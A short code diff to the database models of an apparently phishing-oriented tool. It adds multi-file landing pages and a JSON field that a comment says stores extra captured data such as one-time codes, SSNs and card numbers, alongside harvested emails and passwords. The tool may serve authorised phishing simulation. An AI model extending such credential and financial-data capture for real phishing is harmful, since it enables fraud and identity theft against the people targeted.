@@ -125,6 +125,8 @@ class LandingPage(Base):
     name = Column(String(100), nullable=False)
     url = Column(String(500))
     html_content = Column(Text)
+    root_file = Column(String(255), default="index.html")  # Entry point for multi-file pages
+    files = Column(JSON, default=list)  # List of filenames in the landing page directory
     capture_credentials = Column(Boolean, default=True)
     capture_fields = Column(JSON, default=list)
     redirect_url = Column(String(500))
@@ -223,6 +225,7 @@ class CredentialSubmit(Base):
     recipient_id = Column(Integer, ForeignKey("recipients.id"))
     email = Column(String(255))
     password = Column(String(255))
+    data = Column(JSON, default=dict)  # Extra captured fields (otp, ssn, card, etc.)
     submitted_at = Column(DateTime, default=datetime.utcnow)
     ip_address = Column(String(45))
     user_agent = Column(Text)
